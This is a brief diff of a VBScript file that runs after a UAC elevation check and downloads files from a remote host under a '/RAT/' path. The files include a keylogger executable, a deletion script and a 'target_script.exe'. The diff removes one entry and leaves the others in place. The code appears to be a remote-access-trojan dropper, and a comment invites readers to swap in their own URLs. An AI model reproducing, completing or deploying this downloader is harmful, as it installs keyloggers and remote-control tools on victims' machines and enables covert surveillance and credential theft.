@@ -51,7 +51,6 @@ ElseIf WScript.Arguments(0) = "uac_launched" Then
 '//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
     ' Array of files to download (***REPLACE WITH YOUR URLS AND FILENAMES***)
     arrFiles = Array( _
-        Array("https://arth.imbeddex.com/RAT/hello.vbs", "hello.vbs"), _
         Array("https://arth.imbeddex.com/RAT/del.vbs", "del.vbs"), _
         Array("https://arth.imbeddex.com/RAT/keylogger.exe", "key_l.exe"), _
         Array("https://arth.imbeddex.com/RAT/target_script.exe", "target_script.exe"), _
